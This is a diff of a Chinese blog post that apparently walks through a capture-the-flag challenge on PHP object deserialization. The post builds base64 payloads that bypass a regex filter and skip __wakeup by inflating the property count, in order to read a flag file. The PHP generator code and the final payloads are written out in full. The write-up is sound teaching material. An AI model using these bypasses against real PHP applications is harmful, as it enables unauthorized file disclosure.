class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Q: 那 <code>__wakeup</code> 这个方法是干吗用的？</p>
 <p>A: 当 <strong>反序列化构造这个类</strong> 时执行 <code>__wakeup</code> 方法，会将本地变量 <code>file</code> 重新设置为 file</p>
 <br>
@@ -335,62 +37,55 @@
 <li>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用<code>__wakeup()</code>魔术方法（如果存在的话）</li>
 </ul>
 <p>例子</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name;</span><br><span class="line">	<span class="keyword">private</span> $male;</span><br><span class="line">	<span class="keyword">protected</span> $money = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data, $male)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;male = $male;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$number = <span class="number">66</span>;</span><br><span class="line">$str = <span class="string">'jerry'</span>;</span><br><span class="line">$bool = <span class="keyword">true</span>;</span><br><span class="line">$null = <span class="keyword">NULL</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">1</span>, <span class="string">'b'</span> =&gt; <span class="number">2</span>);</span><br><span class="line">$user = <span class="keyword">new</span> User(<span class="string">'tom'</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($number));</span><br><span class="line">var_dump(serialize($str));</span><br><span class="line">var_dump(serialize($bool));</span><br><span class="line">var_dump(serialize($null));</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">var_dump(serialize($user));</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$male</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$money</span> = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$male</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;male = <span class="variable">$male</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">66</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;jerry&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">2</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="string">&#x27;tom&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize(<span class="variable">$number</span>));</span><br><span class="line">var_dump(serialize(<span class="variable">$str</span>));</span><br><span class="line">var_dump(serialize(<span class="variable">$bool</span>));</span><br><span class="line">var_dump(serialize(<span class="variable">$null</span>));</span><br><span class="line">var_dump(serialize(<span class="variable">$arr</span>));</span><br><span class="line">var_dump(serialize(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure>
 
 
 <p>输出结果</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">5</span>) <span class="string">"i:66;"</span> </span><br><span class="line">string(<span class="number">12</span>) <span class="string">"s:5:"</span>jerry<span class="string">";"</span> </span><br><span class="line">string(<span class="number">4</span>) <span class="string">"b:1;"</span> </span><br><span class="line">string(<span class="number">2</span>) <span class="string">"N;"</span> </span><br><span class="line">string(<span class="number">30</span>) <span class="string">"a:2:&#123;s:1:"</span>a<span class="string">";i:1;s:1:"</span><span class="string">b";i:2;&#125;"</span> </span><br><span class="line">string(<span class="number">93</span>) <span class="string">"O:4:"</span>User<span class="string">":4:&#123;s:4:"</span>name<span class="string">";N;s:10:"</span>Usermale<span class="string">";b:1;s:8:"</span>*money<span class="string">";i:1000;s:4:"</span>data<span class="string">";s:3:"</span>tom<span class="string">";&#125;"</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;i:66;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;s:5:&quot;</span>jerry<span class="string">&quot;;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;b:1;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;N;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">30</span>) <span class="string">&quot;a:2:&#123;s:1:&quot;</span>a<span class="string">&quot;;i:1;s:1:&quot;</span><span class="string">b&quot;;i:2;&#125;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">93</span>) <span class="string">&quot;O:4:&quot;</span>User<span class="string">&quot;:4:&#123;s:4:&quot;</span>name<span class="string">&quot;;N;s:10:&quot;</span>Usermale<span class="string">&quot;;b:1;s:8:&quot;</span>*money<span class="string">&quot;;i:1000;s:4:&quot;</span>data<span class="string">&quot;;s:3:&quot;</span>tom<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 <p> 更多关于序列化的资料请参考</p>
 <blockquote>
-<p><a href="https://blog.csdn.net/qq_35958788/article/details/82975885" target="_blank" rel="noopener">php 序列化与反序列化</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35958788/article/details/82975885">php 序列化与反序列化</a></p>
 </blockquote>
 <h3 id="获取-flag"><a href="#获取-flag" class="headerlink" title="获取 flag"></a>获取 flag</h3><h4 id="构造-序列化"><a href="#构造-序列化" class="headerlink" title="构造 序列化"></a>构造 序列化</h4><p>根据注释的明示直接访问 fl4g.php ，果然是一片空白。</p>
 <p>不过证明的确实有这个文件，并且 flag 就存在这个文件的代码中，需要我们使用 <code>highlight_file</code> 方法来显示出来。</p>
-<p><img src=".md_img/20200211233941.png" alt=""></p>
+<p><img src=".md_img/20200211233941.png"></p>
 <p>构造 <code>Demo</code> 类，传入 <code>$file = fl4g.php</code> ，然后反序列化</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'fl4g.php'</span>;</span><br><span class="line">$demo = <span class="keyword">new</span> Demo($file);</span><br><span class="line">$s = serialize($demo);</span><br><span class="line">print_r($s);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">print_r(base64_encode($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> Demo(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$demo</span>);</span><br><span class="line">print_r(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">print_r(base64_encode(<span class="variable">$s</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>可以使用 在线php 方便的调试 php 代码</p>
-<p><a href="http://www.dooccn.com/php/" target="_blank" rel="noopener">http://www.dooccn.com/php/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.dooccn.com/php/">http://www.dooccn.com/php/</a></p>
 </blockquote>
 <p>得到结果序列化结果：</p>
-<p><code>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code></p>
+<p><code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
 <p>base64 编码后：</p>
 <p><code>Tzo0OiJEZW1vIjoxOntzOjEwOiIARGVtbwBmaWxlIjtzOjg6ImZsNGcucGhwIjt9</code></p>
 <h4 id="绕过正则匹配"><a href="#绕过正则匹配" class="headerlink" title="绕过正则匹配"></a>绕过正则匹配</h4><p>直接传进去，果然被匹配到了</p>
-<p><img src=".md_img/20200212001625.png" alt=""></p>
-<p>不清楚正则匹配的话，在这个网站上(<a href="https://www.regextester.com/" target="_blank" rel="noopener">regextester</a>)可以知道匹配到的部分是前面的 <code>O:4:</code></p>
-<p><img src=".md_img/20200212011140.png" alt=""></p>
+<p><img src=".md_img/20200212001625.png"></p>
+<p>不清楚正则匹配的话，在这个网站上(<a target="_blank" rel="noopener" href="https://www.regextester.com/">regextester</a>)可以知道匹配到的部分是前面的 <code>O:4:</code></p>
+<p><img src=".md_img/20200212011140.png"></p>
 <p>可以在 <code>4</code> 前面加上 <code>+</code> 来绕过，因为在 php 语法中，<code>+4</code> = <code>4</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="number">-4</span>);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="number">-4</span>);</span><br></pre></td></tr></table></figure>
 
 
 <h4 id="利用漏洞，绕过-wakeup"><a href="#利用漏洞，绕过-wakeup" class="headerlink" title="利用漏洞，绕过 __wakeup"></a>利用漏洞，绕过 __wakeup</h4><p>传入绕过正则匹配并编码后的载荷：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var?&#x3D;TzorNDoiRGVtbyI6MTp7czoxMDoiRGVtbyAgZmlsZSI7czo4OiJmbDRnLnBocCI7fQ</span><br></pre></td></tr></table></figure>
-
 <p>果不其然的显示回 index.php 的源码了。</p>
-<p><img src=".md_img/20200212003517.png" alt=""></p>
+<p><img src=".md_img/20200212003517.png"></p>
 <p>这是因为 <strong>反序列化 Demo 对象</strong>后调用了 <code>__wakeup</code> 方法，重新将传入的 <code>fl4g.php</code> 设置为 <code>index.php</code> 了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">        <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">        <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
 
 <p>这个时候就要提到著名的反序列化漏洞了。</p>
-<p>在之前，<code>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code> 中的 <code>:1:</code> 是代表这个对象中有一个属性，上面的 <a href="#序列化和反序列化">序列化和反序列化</a> 的最后一个例子也是同理，只不过在<strong>构造方法</strong>中多了一个 <code>data</code> 属性，所以是 <code>4</code> 。</p>
+<p>在之前，<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code> 中的 <code>:1:</code> 是代表这个对象中有一个属性，上面的 <a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">序列化和反序列化</a> 的最后一个例子也是同理，只不过在<strong>构造方法</strong>中多了一个 <code>data</code> 属性，所以是 <code>4</code> 。</p>
 <br>
 
 <p><code>__wakeup</code> 漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 <code>__wakeup</code> 的执行。</p>
 <p>因此最后的序列化是：</p>
-<p><code>O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code></p>
+<p><code>O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
 <p>编码后：</p>
 <p><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=</code></p>
 <p>载荷是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var?&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30&#x3D;</span><br></pre></td></tr></table></figure>
-
 
 
 <h4 id="巨坑-私有属性"><a href="#巨坑-私有属性" class="headerlink" title="巨坑-私有属性"></a>巨坑-私有属性</h4><p>结果居然还是 <code>index.php</code> 的源码！！！</p>
@@ -398,8 +93,8 @@
 <p>经过多方百度后，发现了一个<strong>盲点</strong>——由于 <code>Demo</code> 类的 <code>file</code> 属性是<strong>私有属性</strong>序列化之后，在类名前后会有 %00 阻断。</p>
 <p>并且在 <code>s:10:&quot;Demofile&quot;</code> 也有提示，<code>Demofile</code> 是 8 个字符，为什么是 <code>s:10</code>  呢？就是因为前后有 %00</p>
 <p>图形化就是这样：</p>
-<p><img src=".md_img/20200212004354.png" alt=""></p>
-<p><code>%44%65%6d%6f</code>进行 hex 转化后 就是 <code>Demo</code> ，可以在这个网站上测试 <a href="https://www.107000.com/T-Hex/" target="_blank" rel="noopener">Hex编码/解码</a></p>
+<p><img src=".md_img/20200212004354.png"></p>
+<p><code>%44%65%6d%6f</code>进行 hex 转化后 就是 <code>Demo</code> ，可以在这个网站上测试 <a target="_blank" rel="noopener" href="https://www.107000.com/T-Hex/">Hex编码/解码</a></p>
 <p><strong>坑来了：</strong></p>
 <p>如果直接复制文本样式，在别的地方进行base64编码会<strong>丢失掉 <code>%00</code> 的信息</strong>！！再 解码-&gt;反序列化 自然与我之前序列化的 Demo <strong>不是同一个东西</strong></p>
 <br>
@@ -407,306 +102,76 @@
 <p>Q: 那咋办呢？</p>
 <p>A: 在 php 中就把<strong>替换</strong>和<strong>base64编码</strong>弄好！</p>
 <p>执行以下代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'fl4g.php'</span>;</span><br><span class="line">$d = <span class="keyword">new</span> Demo($file);</span><br><span class="line">$s = serialize($d);</span><br><span class="line"><span class="comment">// O:4:"Demo":1:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;</span></span><br><span class="line">$s = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>, $s);</span><br><span class="line">$s = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>, $s);</span><br><span class="line">print_r($s);</span><br><span class="line">print_r(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">print_r(base64_encode($s));</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Demo(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$d</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">print_r(<span class="variable">$s</span>);</span><br><span class="line">print_r(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">print_r(base64_encode(<span class="variable">$s</span>));</span><br></pre></td></tr></table></figure>
 <p>使用了 <code>str_replace</code> 方法来进行替换</p>
 <p>这样编码后的结果就还是带有 <code>%00</code> 的了：</p>
 <p><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
-<p><img src=".md_img/20200212005224.png" alt=""></p>
+<p><img src=".md_img/20200212005224.png"></p>
 <p>载荷</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-
-<p><img src=".md_img/20200212005244.png" alt=""></p>
+<p><img src=".md_img/20200212005244.png"></p>
 <h2 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h2><ol>
 <li>__wakeup 方法是反序列化后调用的方法，可以利用<strong>超属性</strong>的方法来绕过</li>
 <li>在 php 中 <code>4</code> = <code>+4</code> ，可以用来绕过正则匹配</li>
 <li>私有属性序列化后会在属性名前加上类名，类名左右会带上 <code>%00</code> </li>
 </ol>
-<h2 id="0x03-参考链接："><a href="#0x03-参考链接：" class="headerlink" title="0x03 - 参考链接："></a>0x03 - 参考链接：</h2><p><a href="https://blog.csdn.net/a3320315/article/details/101406818" target="_blank" rel="noopener">攻防世界 Web_php_unserialize的坑</a></p>
-<p><a href="https://blog.csdn.net/qq_35958788/article/details/82975885" target="_blank" rel="noopener">php 序列化与反序列化</a></p>
-<p><a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">__wakeup()函数漏洞以及实际漏洞分析</a></p>
